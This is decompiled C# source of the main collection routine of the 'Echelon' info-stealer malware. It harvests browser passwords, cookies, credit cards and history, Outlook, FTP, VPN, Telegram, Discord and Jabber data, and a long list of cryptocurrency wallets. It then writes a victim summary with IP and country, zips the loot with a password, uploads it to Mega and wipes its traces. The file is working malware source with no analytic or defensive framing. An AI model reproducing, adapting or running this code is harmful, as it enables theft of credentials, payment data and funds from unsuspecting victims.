using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ChromV1;
using ChromV2;
using Echelon.Global;
using Echelon.Stealer.Browsers;
using Echelon.Stealer.Browsers.Edge;
using Echelon.Stealer.Browsers.Helpers;
using Echelon.Stealer.Browsers.Helpers.NoiseMe.Drags.App.Models.JSON;
using Echelon.Stealer.Discord;
using Echelon.Stealer.EmailClients;
using Echelon.Stealer.FileGrabber;
using Echelon.Stealer.FTP;
using Echelon.Stealer.Jabber;
using Echelon.Stealer.SystemsData;
using Echelon.Stealer.Telegram;
using Echelon.Stealer.VPN;
using Echelon.Stealer.Wallets;
using Ionic.Zip;
using Ionic.Zlib;

namespace Echelon.Stealer
{
	// Token: 0x02000003 RID: 3
	public static class Collection
	{
		// Token: 0x06000004 RID: 4 RVA: 0x0000221C File Offset: 0x0000041C
		[STAThread]
		public static void GetChromium()
		{
			try
			{
				Chromium.Set(Help.HWID);
				Chromium.GetCards(Help.Cards);
				Chromium.GetCookies(Help.Cookies);
				Chromium.GetPasswords(Help.Passwords);
				Chromium.GetAutofills(Help.Autofills);
				Chromium.GetDownloads(Help.Downloads);
				Chromium.GetHistory(Help.History);
				Chromium.GetPasswordsOpera(Help.Passwords);
				Chromium.GetCookiesOpera(Help.Cookies);
			}
			catch
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000022A0 File Offset: 0x000004A0
		public static void GetGecko()
		{
			try
			{
				Steal.Cookies();
				Steal.Passwords();
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022D4 File Offset: 0x000004D4
		public static void GetCollection()
		{
			Collection.<>c__DisplayClass2_0 CS$<>8__locals1 = new Collection.<>c__DisplayClass2_0();
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("Если вы это видите, значит запуск происходит в консольном режиме. Не забудьте перекомпилировать стиллер как 'Приложение Windows'.");
			Console.WriteLine("If you see this, then the launch is in console mode. Do not forget to recompile the stealer as a 'Windows application'.");
			try
			{
				Directory.CreateDirectory(Help.collectionDir);
				Directory.CreateDirectory(Help.Browsers);
				Directory.CreateDirectory(Help.Passwords);
				Directory.CreateDirectory(Help.Autofills);
				Directory.CreateDirectory(Help.Downloads);
				Directory.CreateDirectory(Help.Cookies);
				Directory.CreateDirectory(Help.History);
				Directory.CreateDirectory(Help.Cards);
			}
			catch
			{
			}
			Collection.<>c__DisplayClass2_0 CS$<>8__locals2 = CS$<>8__locals1;
			Task[] array = new Task[1];
			array[0] = new Task(delegate()
			{
				Files.GetFiles(Help.collectionDir);
			});
			CS$<>8__locals2.t0 = array;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals3 = CS$<>8__locals1;
			Task[] array2 = new Task[1];
			array2[0] = new Task(delegate()
			{
				Collection.GetChromium();
			});
			CS$<>8__locals3.t1 = array2;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals4 = CS$<>8__locals1;
			Task[] array3 = new Task[1];
			array3[0] = new Task(delegate()
			{
				Collection.GetGecko();
			});
			CS$<>8__locals4.t2 = array3;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals5 = CS$<>8__locals1;
			Task[] array4 = new Task[1];
			array4[0] = new Task(delegate()
			{
				Edge.GetEdge(Help.Passwords);
			});
			CS$<>8__locals5.t3 = array4;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals6 = CS$<>8__locals1;
			Task[] array5 = new Task[1];
			array5[0] = new Task(delegate()
			{
				Outlook.GrabOutlook(Help.collectionDir);
			});
			CS$<>8__locals6.t4 = array5;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals7 = CS$<>8__locals1;
			Task[] array6 = new Task[1];
			array6[0] = new Task(delegate()
			{
				FileZilla.GetFileZilla(Help.collectionDir);
			});
			CS$<>8__locals7.t5 = array6;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals8 = CS$<>8__locals1;
			Task[] array7 = new Task[1];
			array7[0] = new Task(delegate()
			{
				TotalCommander.GetTotalCommander(Help.collectionDir);
			});
			CS$<>8__locals8.t6 = array7;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals9 = CS$<>8__locals1;
			Task[] array8 = new Task[1];
			array8[0] = new Task(delegate()
			{
				ProtonVPN.GetProtonVPN(Help.collectionDir);
			});
			CS$<>8__locals9.t7 = array8;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals10 = CS$<>8__locals1;
			Task[] array9 = new Task[1];
			array9[0] = new Task(delegate()
			{
				OpenVPN.GetOpenVPN(Help.collectionDir);
			});
			CS$<>8__locals10.t8 = array9;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals11 = CS$<>8__locals1;
			Task[] array10 = new Task[1];
			array10[0] = new Task(delegate()
			{
				NordVPN.GetNordVPN(Help.collectionDir);
			});
			CS$<>8__locals11.t9 = array10;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals12 = CS$<>8__locals1;
			Task[] array11 = new Task[1];
			array11[0] = new Task(delegate()
			{
				Telegram.GetTelegram(Help.collectionDir);
			});
			CS$<>8__locals12.t10 = array11;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals13 = CS$<>8__locals1;
			Task[] array12 = new Task[1];
			array12[0] = new Task(delegate()
			{
				Discord.GetDiscord(Help.collectionDir);
			});
			CS$<>8__locals13.t11 = array12;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals14 = CS$<>8__locals1;
			Task[] array13 = new Task[1];
			array13[0] = new Task(delegate()
			{
				Wallets.GetWallets(Help.collectionDir);
			});
			CS$<>8__locals14.t12 = array13;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals15 = CS$<>8__locals1;
			Task[] array14 = new Task[1];
			array14[0] = new Task(delegate()
			{
				Systemsinfo.GetSystemsData(Help.collectionDir);
			});
			CS$<>8__locals15.t13 = array14;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals16 = CS$<>8__locals1;
			Task[] array15 = new Task[1];
			array15[0] = new Task(delegate()
			{
				DomainDetect.GetDomainDetect(Help.Browsers);
			});
			CS$<>8__locals16.t14 = array15;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals17 = CS$<>8__locals1;
			Task[] array16 = new Task[1];
			array16[0] = new Task(delegate()
			{
				Dec.Decrypt(Help.Passwords);
			});
			CS$<>8__locals17.t15 = array16;
			try
			{
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t0;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t1;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t2;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t3;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t4;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t5;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t6;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t7;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t8;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t9;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t10;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t11;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t12;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t13;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t14;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t15;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				Task.WaitAll(CS$<>8__locals1.t0);
				Task.WaitAll(CS$<>8__locals1.t1);
				Task.WaitAll(CS$<>8__locals1.t2);
				Task.WaitAll(CS$<>8__locals1.t3);
				Task.WaitAll(CS$<>8__locals1.t4);
				Task.WaitAll(CS$<>8__locals1.t5);
				Task.WaitAll(CS$<>8__locals1.t6);
				Task.WaitAll(CS$<>8__locals1.t7);
				Task.WaitAll(CS$<>8__locals1.t8);
				Task.WaitAll(CS$<>8__locals1.t9);
				Task.WaitAll(CS$<>8__locals1.t10);
				Task.WaitAll(CS$<>8__locals1.t11);
				Task.WaitAll(CS$<>8__locals1.t12);
				Task.WaitAll(CS$<>8__locals1.t13);
				Task.WaitAll(CS$<>8__locals1.t14);
				Task.WaitAll(CS$<>8__locals1.t15);
			}
			catch
			{
			}
			string contents = string.Concat(new string[]
			{
				JsonValue.buildversion,
				"\n\ud83d\udc64 ",
				Help.machineName,
				"/",
				Help.userName,
				"\n\ud83c\udff4 IP: ",
				Help.IP(),
				Help.Country(),
				"\n\ud83c\udf10 Browsers Data\n   ∟\ud83d\udd11\n     ∟Chromium v1: ",
				Chromium.Passwords.ToString(),
				"\n     ∟Chromium v2: ",
				Dec.colvo.ToString(),
				"\n     ∟Edge: ",
				Edge.count.ToString(),
				"\n     ∟Gecko: ",
				Steal.count.ToString(),
				"\n   ∟\ud83c\udf6a",
				(Chromium.Cookies + Steal.count_cookies).ToString(),
				"\n   ∟\ud83d\udd51",
				Chromium.History.ToString(),
				"\n   ∟\ud83d\udcdd",
				Chromium.Autofills.ToString(),
				"\n   ∟\ud83d\udcb3",
				Chromium.CC.ToString(),
				"\n   ∟⨭",
				Chromium.Downloads.ToString(),
				"\n\ud83d\udcb6 Wallets: ",
				(Wallets.count > 0) ? "✅" : "❌",
				(Electrum.count > 0) ? " Electrum" : "",
				(Armory.count > 0) ? " Armory" : "",
				(AtomicWallet.count > 0) ? " Atomic" : "",
				(BitcoinCore.count > 0) ? " BitcoinCore" : "",
				(Bytecoin.count > 0) ? " Bytecoin" : "",
				(DashCore.count > 0) ? " DashCore" : "",
				(Ethereum.count > 0) ? " Ethereum" : "",
				(Exodus.count > 0) ? " Exodus" : "",
				(LitecoinCore.count > 0) ? " LitecoinCore" : "",
				(Monero.count > 0) ? " Monero" : "",
				(Zcash.count > 0) ? " Zcash" : "",
				(Jaxx.count > 0) ? " Jaxx" : "",
				"\n\ud83d\udcc2 FileGrabber: ",
				Files.count.ToString(),
				"\n\ud83d\udcac Discord: ",
				(Discord.count > 0) ? "✅" : "❌",
				"\n✈️ Telegram: ",
				(Telegram.count > 0) ? "✅" : "❌",
				"\n\ud83d\udca1 Jabber: ",
				(Startjabbers.count + Pidgin.PidginCount > 0) ? "✅" : "❌",
				(Pidgin.PidginCount > 0) ? (" Pidgin (" + Pidgin.PidginAkks.ToString() + ")") : "",
				(Startjabbers.count > 0) ? " Psi" : "",
				"\n\ud83d\udce1 FTP\n   ∟ FileZilla: ",
				(FileZilla.count > 0) ? ("✅ (" + FileZilla.count.ToString() + ")") : "❌",
				"\n   ∟ TotalCmd: ",
				(TotalCommander.count > 0) ? "✅" : "❌",
				"\n\ud83d\udd0c VPN\n   ∟ NordVPN: ",
				(NordVPN.count > 0) ? "✅" : "❌",
				"\n   ∟ OpenVPN: ",
				(OpenVPN.count > 0) ? "✅" : "❌",
				"\n   ∟ ProtonVPN: ",
				(ProtonVPN.count > 0) ? "✅" : "❌",
				"\n\ud83c\udd94 HWID: ",
				Help.HWID,
				"\n⚙️ ",
				Systemsinfo.GetOSInformation(),
				"\n\ud83d\udd0e ",
				File.ReadAllText(Help.Browsers + "\\DomainDetect.txt")
			});
			File.WriteAllText(Help.collectionDir + "\\InfoHERE.txt", contents);
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("Упаковка архива");
			string text = string.Concat(new string[]
			{
				Help.dir,
				"\\",
				Help.userName,
				"_",
				Help.machineName,
				Help.CountryCOde(),
				".zip"
			});
			using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
			{
				zipFile.ParallelDeflateThreshold = -1L;
				zipFile.UseZip64WhenSaving = Zip64Option.Always;
				zipFile.CompressionLevel = CompressionLevel.Default;
				zipFile.Password = Program.passwordzip;
				zipFile.AddDirectory(Help.collectionDir);
				try
				{
					zipFile.Save(text);
				}
				catch
				{
					text = Help.dir + "\\" + Help.HWID + ".zip";
					zipFile.Save(text);
				}
			}
			Console.WriteLine("Залив на мегу");
			MegaSend.Send(text);
			Clean.GetClean();
		}
	}
}
